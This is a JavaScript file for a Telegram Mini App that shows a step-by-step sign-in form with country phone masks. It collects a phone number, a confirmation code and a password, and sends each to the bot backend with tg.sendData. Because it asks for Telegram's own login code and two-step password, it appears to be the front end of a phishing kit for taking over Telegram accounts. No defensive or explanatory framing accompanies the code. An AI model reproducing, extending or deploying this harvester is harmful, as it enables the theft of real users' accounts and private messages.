let tg = window.Telegram.WebApp;
tg.expand();

let currentStep = 1;
let selectedCountry = 'Россия';
let phoneNumber = '';

// Маски для разных стран
const masks = {
    'Россия': '+7 (___) ___-__-__',
    'Украина': '+380 (__) ___-__-__',
    'Казахстан': '+77 (___) ___-__-__',
    'Беларусь': '+375 (__) ___-__-__',
    'Узбекистан': '+998 (__) ___-__-__',
    'Другое': '+___________'
};

// Функция для применения маски
function maskPhone(input, mask) {
    let value = input.value.replace(/\D/g, '');
    let result = '';
    let index = 0;
    
    for (let i = 0; i < mask.length; i++) {
        if (index >= value.length) break;
        
        if (mask[i] === '_') {
            result += value[index];
            index++;
        } else {
            result += mask[i];
        }
    }
    
    input.value = result;
}

// Обработчик выбора страны
document.getElementById('country').addEventListener('change', function(e) {
    selectedCountry = e.target.value;
    let phoneInput = document.getElementById('phone');
    phoneInput.value = masks[selectedCountry].replace(/[^+]/g, '').split('_')[0];
});

// Обработчик ввода номера
document.getElementById('phone').addEventListener('input', function(e) {
    maskPhone(e.target, masks[selectedCountry]);
});

// Кнопка получения кода
document.getElementById('getCodeBtn').addEventListener('click', function() {
    phoneNumber = document.getElementById('phone').value.replace(/\D/g, '');
    
    if (phoneNumber.length < 10) {
        tg.showAlert('Введите корректный номер телефона');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'start_auth',
        country: selectedCountry,
        phone: document.getElementById('phone').value
    }));
    
    setTimeout(() => {
        showLoading(false);
        showStep(2);
    }, 1500);
});

// Кнопка подтверждения кода
document.getElementById('submitCodeBtn').addEventListener('click', function() {
    let code = document.getElementById('code').value.replace(/\D/g, '');
    
    if (code.length < 4) {
        tg.showAlert('Введите код подтверждения');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'submit_code',
        code: code
    }));
});

// Кнопка отправки пароля
document.getElementById('submitPasswordBtn').addEventListener('click', function() {
    let password = document.getElementById('password').value;
    
    if (!password) {
        tg.showAlert('Введите пароль');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'submit_password',
        password: password
    }));
});

function showStep(step) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
}

function showLoading(show) {
    document.getElementById('loading').style.display = show ? 'block' : 'none';
    document.querySelectorAll('.step').forEach(el => {
        el.style.display = show ? 'none' : '';
    });
}

// Обработка ответов от бота
tg.onEvent('mainButtonClicked', function() {
    tg.close();
});

// Инициализация
document.getElementById('phone').value = '+7';